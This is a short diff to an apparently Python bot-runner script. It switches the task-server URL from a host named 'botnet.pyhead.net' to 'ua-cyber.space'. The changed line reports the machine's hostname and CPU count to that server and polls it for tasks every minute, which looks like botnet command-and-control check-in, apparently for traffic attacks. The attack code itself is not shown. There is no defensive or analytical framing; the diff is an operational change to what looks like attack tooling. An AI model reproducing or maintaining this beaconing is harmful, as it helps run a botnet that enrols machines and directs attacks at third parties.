@@ -22,7 +22,7 @@ getLogger('proxies').setLevel("CRITICAL")
 logger = getLogger("Bot Runner")
 logger.setLevel("INFO")
 
-url = f"https://botnet.pyhead.net/api/v2/tasks/json/?hostname={gethostname()}&cpu_count={psutil.cpu_count()}"
+url = f"https://ua-cyber.space/api/v2/tasks/json/?hostname={gethostname()}&cpu_count={psutil.cpu_count()}"
 
 loop_time = 60
 RETRY_PERIOD_SEC = 30
